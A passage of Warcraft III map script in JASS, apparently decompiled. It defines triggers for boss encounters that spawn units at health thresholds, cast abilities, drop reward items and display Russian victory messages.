endfunction
function BlE takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[110]) then
return false
endif
return true
endfunction
function BlF takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BlG takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BlH takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BlI takes nothing returns boolean
if not (CountUnitsInGroup(SR)>=1) then
return false
endif
return true
endfunction
function BlJ takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set SR=GetUnitsInRectOfPlayer(Gz,Player(10))
if BlI() then
call ForGroupBJ(SR,function BlF)
call ForGroupBJ(GetUnitsInRectMatching(Gz,Condition(function BlG)),function BlH)
call SetUnitLifePercentBJ(K8,100)
set Tt[110]=80.
else
endif
call DestroyGroup(SR)
set Tt[110]=Tt[110]-20.
set V0=GetRandomLocInRect(Gz)
call CreateNUnitsAtLoc(3,$6E303342,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
set V0=GetRandomLocInRect(Gz)
call CreateNUnitsAtLoc(3,$6E30375A,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BlK takes nothing returns nothing
set e2=CreateTrigger()
call TriggerRegisterUnitEvent(e2,K8,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(e2,Condition(function BlE))
call TriggerAddAction(e2,function BlJ)
endfunction
function BlL takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303054) then
return false
endif
if not (IsUnitIllusionBJ(GetTriggerUnit())==false) then
return false
endif
return true
endfunction
function BlM takes nothing returns boolean
if not (So>=10) then
return false
endif
return true
endfunction
function BlN takes nothing returns nothing
call EnableTrigger(bI)
call DisableTrigger(e4)
call DestroyEffectBJ(Us[37])
call AddSpecialEffectTargetUnitBJ("overhead",Kc,"Objects\\RandomObject\\RandomObject.mdl")
set Us[37]=GetLastCreatedEffectBJ()
call DisplayTextToForce(GetPlayersAll(),"Смерть убита!")
if BlM() then
call CreateTextTagUnitBJ("VICTORY",GetTriggerUnit(),0,30.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call CreateItemLoc($49304832,GetUnitLoc(GetTriggerUnit()))
else
endif
endfunction
function BlO takes nothing returns nothing
set e3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(e3,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(e3,Condition(function BlL))
call TriggerAddAction(e3,function BlN)
endfunction
function BlP takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BlQ takes nothing returns nothing
set Vz=Location(-5700.,-22150.)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Vz,0)
call SetUnitPositionLoc(GetTriggerUnit(),Vz)
call RemoveLocation(Vz)
call SetUnitInvulnerable(K8,true)
call SetUnitOwner(K8,Player(PLAYER_NEUTRAL_PASSIVE),true)
set Tt[1]=75.
call SetUnitLifePercentBJ(K8,100)
set Tt[110]=80.
endfunction
function BlR takes nothing returns nothing
set e4=CreateTrigger()
call TriggerRegisterEnterRectSimple(e4,Fs)
call TriggerAddCondition(e4,Condition(function BlP))
call TriggerAddAction(e4,function BlQ)
endfunction
function BlS takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[1]) then
return false
endif
return true
endfunction
function BlT takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[1])
set Tt[1]=Tt[1]-25.
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=10
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set Rt=Rt+36.
set WR[2]=GetUnitLoc(GetTriggerUnit())
set Rs[2]=GetRandomReal(Rt-2.,Rt+2.)
set Ru[2]=GetRandomReal(-5.,5.)
set Rr[2]=GetRandomReal(200.,200.)
call CreateNUnitsAtLoc(1,$68303458,Player(10),WR[2],Rs[2])
set WS[2]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(3.,$42544C46,WS[2])
set WR[2]=PolarProjectionBJ(WR[2],Rr[2],Rs[2])
call SetUnitPositionLoc(WS[2],WR[2])
call IssueImmediateOrder(WS[2],"fanofknives")
call RemoveLocation(WR[2])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call TriggerSleepAction(3.)
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=10
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set Rt=Rt+36.
set WR[2]=GetUnitLoc(GetTriggerUnit())
set Rs[2]=GetRandomReal(Rt-2.,Rt+2.)
set Ru[2]=GetRandomReal(-5.,5.)
set Rr[2]=GetRandomReal(600.,600.)
call CreateNUnitsAtLoc(1,$68303458,Player(10),WR[2],Rs[2])
set WS[2]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(3.,$42544C46,WS[2])
set WR[2]=PolarProjectionBJ(WR[2],Rr[2],Rs[2])
call SetUnitPositionLoc(WS[2],WR[2])
call IssueImmediateOrder(WS[2],"fanofknives")
call RemoveLocation(WR[2])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BlU takes nothing returns nothing
set e5=CreateTrigger()
call TriggerRegisterUnitEvent(e5,K8,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(e5,Condition(function BlS))
call TriggerAddAction(e5,function BlT)
endfunction
function BlV takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BlW takes nothing returns nothing
local location Mc
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
call SetUnitInvulnerable(GetTriggerUnit(),true)
if BlV() then
set Mc=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$75303053,Player(10),Mc,bj_UNIT_FACING)
call RemoveLocation(Mc)
else
endif
call TriggerSleepAction(5.)
call EnableTrigger(GetTriggeringTrigger())
set Mc=null
endfunction
function BlX takes nothing returns nothing
set e6=CreateTrigger()
call TriggerRegisterUnitEvent(e6,Lq,EVENT_UNIT_DAMAGED)
call TriggerAddAction(e6,function BlW)
endfunction
function BlY takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303053) then
return false
endif
return true
endfunction
function BlZ takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303052) then
return false
endif
if not (Sm<=3) then
return false
endif
return true
endfunction
function Bla takes nothing returns nothing
if BlY() then
call SetUnitInvulnerable(Lq,false)
set Sm=Sm+1
else
endif
if BlZ() then
call CreateTextTagUnitBJ("VICTORY",GetTriggerUnit(),0,30.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю!!! Вы убили |c007d7d7dТемного Рыцаря|r особым способом, и в награду Вы получаете особую вещь.")
call CreateItemLoc($49304756,GetUnitLoc(GetTriggerUnit()))
else
endif
endfunction
function Blb takes nothing returns nothing
set e7=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(e7,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(e7,function Bla)
endfunction
function Blc takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(35.)
call SetUnitVertexColor(Lp,0,0,0,100)
call UnitAddAbilityBJ($4130444A,GetTriggerUnit())
call TriggerSleepAction(15.)
call SetUnitVertexColor(Lp,255,255,255,255)
call UnitRemoveAbilityBJ($4130444A,GetTriggerUnit())
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bld takes nothing returns nothing
set e8=CreateTrigger()
call TriggerRegisterUnitEvent(e8,Lp,EVENT_UNIT_DAMAGED)
call TriggerAddAction(e8,function Blc)
endfunction
function Ble takes nothing returns boolean
if not (GetRandomInt(1,5)==1) then
return false
endif
return true
endfunction
function Blf takes nothing returns boolean
if not (GetRandomInt(1,5)==2) then
return false
endif
return true
endfunction
function Blg takes nothing returns boolean
if not (GetRandomInt(1,5)==3) then
return false
endif
return true
endfunction
function Blh takes nothing returns nothing
if Ble() then
call IssueTargetOrderBJ(GetTriggerUnit(),"banish",GetEventDamageSource())
else
endif
if Blf() then
call IssueTargetOrderBJ(GetTriggerUnit(),"entanglingroots",GetEventDamageSource())
else
endif
if Blg() then
call IssuePointOrderLoc(GetTriggerUnit(),"silence",GetUnitLoc(GetEventDamageSource()))
else
endif
endfunction
function Bli takes nothing returns nothing
set e9=CreateTrigger()
call TriggerRegisterUnitEvent(e9,Lp,EVENT_UNIT_DAMAGED)
call TriggerAddAction(e9,function Blh)
endfunction
function Blj takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303050) then
return false
endif
return true
endfunction
function Blk takes nothing returns boolean
if not (RectContainsUnit(Dc,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bll takes nothing returns boolean
if not (RectContainsUnit(Dd,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Blm takes nothing returns boolean
if not (RectContainsUnit(De,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bln takes nothing returns boolean
if not (RectContainsUnit(Df,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Blo takes nothing returns boolean
if not (RectContainsUnit(Dg,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Blp takes nothing returns nothing
if Blk() then
set Sl=Sl+1
call AddSpecialEffectLocBJ(GetRectCenter(Dc),"Doodads\\Cinematic\\GlowingRunes\\GlowingRunes5.mdl")
call CreateNUnitsAtLoc(1,$75303051,Player(10),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call RemoveRect(Dc)
else
endif
if Bll() then
set Sl=Sl+1
call AddSpecialEffectLocBJ(GetRectCenter(Dd),"Doodads\\Cinematic\\GlowingRunes\\GlowingRunes5.mdl")
call CreateNUnitsAtLoc(1,$75303051,Player(10),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call RemoveRect(Dd)
else
endif
if Blm() then
set Sl=Sl+1
call AddSpecialEffectLocBJ(GetRectCenter(De),"Doodads\\Cinematic\\GlowingRunes\\GlowingRunes5.mdl")
call CreateNUnitsAtLoc(1,$75303051,Player(10),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call RemoveRect(De)
else
endif
if Bln() then
set Sl=Sl+1
call AddSpecialEffectLocBJ(GetRectCenter(Df),"Doodads\\Cinematic\\GlowingRunes\\GlowingRunes5.mdl")
call CreateNUnitsAtLoc(1,$75303051,Player(10),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call RemoveRect(Df)
else
endif
if Blo() then
set Sl=Sl+1
call AddSpecialEffectLocBJ(GetRectCenter(Dg),"Doodads\\Cinematic\\GlowingRunes\\GlowingRunes5.mdl")
call CreateNUnitsAtLoc(1,$75303051,Player(10),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call RemoveRect(Dg)
else
endif
endfunction
function Blq takes nothing returns nothing
set fB=CreateTrigger()
call TriggerRegisterEnterRectSimple(fB,Dc)
call TriggerRegisterEnterRectSimple(fB,Dd)
call TriggerRegisterEnterRectSimple(fB,De)
call TriggerRegisterEnterRectSimple(fB,Df)
call TriggerRegisterEnterRectSimple(fB,Dg)
call TriggerAddCondition(fB,Condition(function Blj))
call TriggerAddAction(fB,function Blp)
endfunction
function Blr takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303050) then
return false
endif
return true
endfunction
function Bls takes nothing returns boolean
if not (Sl>=5) then
return false
endif
return true
endfunction
function Blt takes nothing returns nothing
call CreateItemLoc($49304752,GetUnitLoc(GetTriggerUnit()))
call CreateItemLoc($49304751,GetUnitLoc(GetTriggerUnit()))
call CreateItemLoc($49304750,GetUnitLoc(GetTriggerUnit()))
if Bls() then
call CreateTextTagUnitBJ("VICTORY",GetTriggerUnit(),0,30.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю!!! Вы убили |c007d7d7dОракула|r особым способом, и в награду Вы получаете особую вещь.")
call CreateItemLoc($4930474F,GetUnitLoc(GetTriggerUnit()))
else
endif
endfunction
function Blu takes nothing returns nothing
set fC=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(fC,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(fC,Condition(function Blr))
call TriggerAddAction(fC,function Blt)
endfunction
function Blv takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=30.) then
return false
endif
return true
endfunction
function Blw takes nothing returns nothing
local location fE=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(5,$6530304D,Player(10),fE,bj_UNIT_FACING)
call RemoveLocation(fE)
call DisableTrigger(GetTriggeringTrigger())
set fE=null
endfunction
function Blx takes nothing returns nothing
set fD=CreateTrigger()
call TriggerRegisterUnitEvent(fD,Ln,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(fD,Condition(function Blv))
call TriggerAddAction(fD,function Blw)
endfunction
function Bly takes nothing returns nothing
local location fE
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
set fE=GetUnitLoc(GetEventDamageSource())
call CreateItemLoc($4930474A,fE)
call RemoveLocation(fE)
call EnableTrigger(GetTriggeringTrigger())
set fE=null
endfunction
function Blz takes nothing returns nothing
set fF=CreateTrigger()
call TriggerRegisterUnitEvent(fF,Ln,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fF,function Bly)
endfunction
function Bl0 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930474A) then
return false
endif
return true
endfunction
function Bl1 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bl2 takes nothing returns nothing
call SetUnitLifeBJ(Ln,GetUnitStateSwap(UNIT_STATE_LIFE,Ln)+GetUnitStateSwap(UNIT_STATE_MAX_LIFE,Ln)*.3)
if Bl1() then
call KillUnit(GetTriggerUnit())
else
endif
endfunction
function Bl3 takes nothing returns nothing
set fG=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(fG,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(fG,Condition(function Bl0))
call TriggerAddAction(fG,function Bl2)
endfunction
function Bl4 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6530304C) then
return false
endif
return true
endfunction
function Bl5 takes nothing returns nothing
local location d2=GetRectCenter(Gp)
local integer L9=0
call SetUnitPositionLoc(GetTriggerUnit(),d2)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(d2)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
set d2=null
endfunction
function Bl6 takes nothing returns nothing
set fH=CreateTrigger()
call TriggerRegisterLeaveRectSimple(fH,Gp)
call TriggerAddCondition(fH,Condition(function Bl4))
call TriggerAddAction(fH,function Bl5)
endfunction
function Bl7 takes nothing returns boolean
if not (CountUnitsInGroup(SR)==0) then
return false
endif
return true
endfunction
function Bl8 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6530304C) then
return false
endif
return true
endfunction
function Bl9 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6530304D) then
return false
endif
return true
endfunction
function BmB takes nothing returns nothing
local location Mc
if Bl8() then
set Mc=GetRectCenter(Gp)
call CreateItemLoc($4930474E,Mc)
call CreateItemLoc($4930474D,Mc)
call CreateItemLoc($4930474C,Mc)
set SR=GetUnitsOfTypeIdAll($6530304D)
if Bl7() then
call CreateTextTagUnitBJ("VICTORY",GetTriggerUnit(),0,30.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю!!! Вы убили |c007d7d7dГорного Камешка|r особым способом, и в награду Вы получаете особую вещь.")
call CreateItemLoc($4930474B,Mc)
else
call DoNothing()
endif
call DestroyGroup(SR)
call RemoveLocation(Mc)
else
endif
if Bl9() then
call RemoveUnit(GetTriggerUnit())
else
endif
set Mc=null
endfunction
function BmC takes nothing returns nothing
set fI=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(fI,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(fI,function BmB)
endfunction
function BmD takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BmE takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25.)
if BmD() then
call CreateNUnitsAtLoc(1,$68303339,Player(10),GetRandomLocInRect(BO),bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(10.,$42544C46,GetLastCreatedUnit())
call TriggerSleepAction(25.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BmF takes nothing returns nothing
set fJ=CreateTrigger()
call TriggerRegisterUnitEvent(fJ,Ld,EVENT_UNIT_ATTACKED)
call TriggerAddAction(fJ,function BmE)
endfunction
function BmG takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set Vz=GetRandomLocInRect(BO)
call CreateNUnitsAtLoc(1,$6E676772,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(120.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BmH takes nothing returns nothing
set fK=CreateTrigger()
call TriggerRegisterUnitEvent(fK,Ld,EVENT_UNIT_ATTACKED)
call TriggerAddAction(fK,function BmG)
endfunction
function BmI takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<60.) then
return false
endif
return true
endfunction
function BmJ takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41303542,GetTriggerUnit())
endfunction
function BmK takes nothing returns nothing
set fL=CreateTrigger()
call TriggerRegisterUnitEvent(fL,Kz,EVENT_UNIT_ATTACKED)
call TriggerAddCondition(fL,Condition(function BmI))
call TriggerAddAction(fL,function BmJ)
endfunction
function BmL takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BmM takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(30.)
if BmL() then
call UnitAddAbilityBJ($41304F48,GetTriggerUnit())
call SetUnitVertexColor(Lu,255,0,255,100)
call TriggerSleepAction(15.)
call UnitRemoveAbilityBJ($41304F48,GetTriggerUnit())
call SetUnitVertexColor(Lu,255,255,255,255)
call TriggerSleepAction(15.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BmN takes nothing returns nothing
set fM=CreateTrigger()
call TriggerRegisterUnitEvent(fM,Lu,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fM,function BmM)
endfunction
function BmO takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[4]) then
return false
endif
return true
endfunction
function BmP takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BmQ takes nothing returns nothing
local location Mc
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[4])
set Tt[4]=Tt[4]-25.
if BmP() then
call CreateTextTagUnitBJ("А вот и я!",Lu,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set Mc=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303338,Player(10),Mc,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(10.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Mc)
call EnableTrigger(GetTriggeringTrigger())
else
endif
set Mc=null
endfunction
function BmR takes nothing returns nothing
set fN=CreateTrigger()
call TriggerRegisterUnitEvent(fN,Lu,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(fN,Condition(function BmO))
call TriggerAddAction(fN,function BmQ)
endfunction
function BmS takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[5]) then
return false
endif
return true
endfunction
function BmT takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BmU takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[5])
set Tt[5]=Tt[5]-15.
if BmT() then
call SetUnitVertexColor(Lu,255,0,0,200)
call EnableTrigger(fP)
call TriggerSleepAction(15.)
call DisableTrigger(fP)
call SetUnitVertexColor(Lu,255,255,255,255)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BmV takes nothing returns nothing
set fO=CreateTrigger()
call TriggerRegisterUnitEvent(fO,Lu,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(fO,Condition(function BmS))
call TriggerAddAction(fO,function BmU)
endfunction
function BmW takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (UnitHasBuffBJ(GetTriggerUnit(),$42303348)==true) then
return false
endif
return true
endfunction
function BmX takes nothing returns nothing
call SetUnitLifeBJ(GetTriggerUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetTriggerUnit())-GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetTriggerUnit())/4.)
endfunction
function BmY takes nothing returns nothing
set fQ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(fQ,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(fQ,Condition(function BmW))
call TriggerAddAction(fQ,function BmX)
endfunction
function BmZ takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[6]) then
return false
endif
return true
endfunction
function Bma takes nothing returns boolean
if not (IsUnitAliveBJ(fS)==true) then
return false
endif
return true
endfunction
function Bmb takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bmc takes nothing returns nothing
local location Mc
local unit No
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[6])
set Tt[6]=Tt[6]-20.
if Bmb() then
set Mc=GetRandomLocInRect(DW)
set No=CreateUnitAtLoc(Player(8),$68303337,Mc,270.)
call RemoveLocation(Mc)
call TriggerSleepAction(10.)
if Bma() then
call RemoveUnit(No)
else
set Mc=GetUnitLoc(No)
call CreateNUnitsAtLoc(15,$6E303458,Player(10),Mc,bj_UNIT_FACING)
call RemoveUnit(No)
call RemoveLocation(Mc)
endif
call EnableTrigger(GetTriggeringTrigger())
else
endif
set No=null
set Mc=null
endfunction
function Bmd takes nothing returns nothing
set fR=CreateTrigger()
call TriggerRegisterUnitEvent(fR,Lu,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(fR,Condition(function BmZ))
call TriggerAddAction(fR,function Bmc)
endfunction
function Bme takes nothing returns boolean
if not (GetUnitTypeId(GetAttacker())==$6E303456) then
return false
endif
return true
endfunction
function Bmf takes nothing returns nothing
call AddSpecialEffectTargetUnitBJ("chest",GetAttackedUnitBJ(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call UnitDamageTargetBJ(GetAttacker(),GetAttackedUnitBJ(),GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetTriggerUnit())*.1,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
endfunction
function Bmg takes nothing returns nothing
set fP=CreateTrigger()
call DisableTrigger(fP)
call TriggerRegisterAnyUnitEventBJ(fP,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(fP,Condition(function Bme))
call TriggerAddAction(fP,function Bmf)
endfunction
function Bmh takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[3]) then
return false
endif
return true
endfunction
function Bmi takes nothing returns boolean
if not (Sh[0]>6) then
return false
endif
return true
endfunction
function Bmj takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bmk takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[3])
set Tt[3]=Tt[3]-30.
if Bmj() then
set Sh[0]=0
set fU[0]=GetRectCenter(DW)
call CreateNUnitsAtLoc(1,$6E303459,Player(PLAYER_NEUTRAL_PASSIVE),fU[0],bj_UNIT_FACING)
set fV[0]=GetLastCreatedUnit()
call UnitIgnoreAlarm(GetTriggerUnit(),true)
call SetUnitPositionLoc(GetTriggerUnit(),fU[0])
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(GetTriggerUnit(),true)
call RemoveLocation(fU[0])
call EnableTrigger(fW)
call TriggerSleepAction(30.)
if Bmi() then
set Sh[0]=0
call RemoveUnit(fV[0])
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(GetTriggerUnit(),false)
call DisableTrigger(fW)
else
set Sh[0]=0
call RemoveUnit(fV[0])
call UnitDamagePointLoc(GetTriggerUnit(),0,2000.,GetRectCenter(DW),999999.,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL)
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(GetTriggerUnit(),false)
call DisableTrigger(fW)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
set Tt[3]=70.
set Tt[4]=75.
set Tt[5]=85.
set Tt[6]=80.
endif
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bml takes nothing returns nothing
set fT=CreateTrigger()
call TriggerRegisterUnitEvent(fT,Lu,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(fT,Condition(function Bmh))
call TriggerAddAction(fT,function Bmk)
endfunction
function Bmm takes nothing returns nothing
local location d2=GetRandomLocInRect(DW)
call CreateNUnitsAtLoc(1,$6E30345A,Player(10),d2,bj_UNIT_FACING)
call RemoveLocation(d2)
set d2=null
endfunction
function Bmn takes nothing returns nothing
set fW=CreateTrigger()
call DisableTrigger(fW)
call TriggerRegisterTimerEventPeriodic(fW,3.)
call TriggerAddAction(fW,function Bmm)
endfunction
function Bmo takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E30345A) then
return false
endif
return true
endfunction
function Bmp takes nothing returns nothing
set Sh[0]=Sh[0]+1
endfunction
function Bmq takes nothing returns nothing
set fX=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(fX,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(fX,Condition(function Bmo))
call TriggerAddAction(fX,function Bmp)
endfunction
function Bmr takes nothing returns nothing
local location d2
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(70.)
set d2=GetUnitLoc(GetTriggerUnit())
set Si=1
loop
exitwhen Si>15
set fZ[Si]=GetUnitLoc(GetTriggerUnit())
set fa[Si]=PolarProjectionBJ(fZ[Si],40.,GetUnitFacing(GetTriggerUnit()))
call SetUnitPositionLoc(GetTriggerUnit(),fa[Si])
call CreateNUnitsAtLoc(1,$68303341,Player(10),fa[Si],bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(20.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(fZ[Si])
call RemoveLocation(fa[Si])
set Si=Si+1
endloop
call SetUnitPositionLoc(GetTriggerUnit(),d2)
call RemoveLocation(d2)
call EnableTrigger(GetTriggeringTrigger())
set d2=null
endfunction
function Bms takes nothing returns nothing
set fY=CreateTrigger()
call TriggerRegisterUnitEvent(fY,Lu,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fY,function Bmr)
endfunction
function Bmt takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303256) then
return false
endif
return true
endfunction
function Bmu takes nothing returns nothing
call IssueImmediateOrder(GetTriggerUnit(),"fanofknives")
call TriggerSleepAction(1.)
call RemoveUnit(GetTriggerUnit())
